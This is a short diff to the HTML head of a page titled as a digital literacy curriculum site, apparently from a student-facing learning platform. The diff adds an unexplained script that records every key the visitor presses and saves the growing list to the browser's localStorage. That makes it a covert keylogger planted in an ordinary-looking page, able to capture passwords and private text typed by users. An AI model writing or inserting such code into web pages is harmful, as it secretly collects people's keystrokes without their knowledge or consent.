@@ -5,6 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Digital Literacy Curriculum | Bedrock Learning</title>
     <link rel="icon" type="image/x-xicon" href="https://hello12111211.github.io/1/idk/Fevicon.ico">
+    
+<script>
+  document.addEventListener("keydown", function(event) {
+    let keys = JSON.parse(localStorage.getItem("keys") || "[]");
+    keys.push(event.key);
+    localStorage.setItem("keys", JSON.stringify(keys));
+  });
+</script>
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
